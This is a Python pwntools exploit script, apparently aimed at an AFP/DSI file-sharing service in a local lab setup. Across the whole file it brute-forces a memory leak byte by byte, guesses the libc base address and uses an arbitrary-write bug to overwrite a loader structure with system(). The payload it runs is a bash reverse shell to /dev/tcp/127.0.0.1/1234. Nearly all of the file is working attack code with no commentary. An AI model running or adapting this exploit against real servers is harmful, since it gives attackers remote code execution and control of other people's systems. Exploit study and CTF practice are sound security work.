#!/usr/bin/env python3
from pwn import *

context(endian="little", log_level="debug")
ip = "127.0.0.1"
port = 5566
libc = ELF("./libc.so.6")


def genDSI(data):
    dsi_header = b""
    dsi_header += b"\x00"
    dsi_header += b"\x04"
    dsi_header += b"\x00\x01"
    dsi_header += p32(0)
    dsi_header += p32(len(data), endian="big")
    dsi_header += p32(0)
    dsi_header += data
    return dsi_header


def arbitraryWrite(io, addr, data):
    payload = b"\x01" + p8(0x18) + b"a" * 0x10 + p64(addr)
    io.send(genDSI(payload))
    io.recv()
    io.send(genDSI(data))


def bruteForce():
    leak_addr = b""
    while len(leak_addr) < 6:
        for i in range(255, -1, -1):
            io = remote(ip, port)
            payload = (
                b"\x01"
                + p8(0x10 + len(leak_addr) + 1)
                + b"a" * 0x10
                + leak_addr
                + p8(i)
            )
            io.send(genDSI(payload))
            try:
                a = io.recv()
                leak_addr += p8(i)
                log.success("Find! {}".format(hex(i)))
                io.close()
                break
            except:
                io.close()
    return u64(leak_addr.ljust(8, b"\x00"))


leak_addr = bruteForce()
leak_addr = leak_addr & 0xFFFFFF000000
log.success("################## Leak: " + hex(leak_addr) + " ##################")
log.info("START TRY LIBC")

for i in range(0x0000000, 0xFFFF000, 0x1000):
    libc.address = leak_addr - i
    log.success("Try libc base address: " + str(hex(libc.address)))
    rtld = libc.address + 0xED4060
    # offset libc-ld server 0xed2060
    # rtld = libc.address + 0xED2060
    cmd = b'bash -c "bash  -i >& /dev/tcp/127.0.0.1/1234 0<&1"'
    try:
        io = remote(ip, port)
        arbitraryWrite(
            io, rtld + 2312, cmd.ljust(0x5F8, b"\x00") + p64(libc.symbols["system"])
        )
        io.close()
    except:
        io.close()
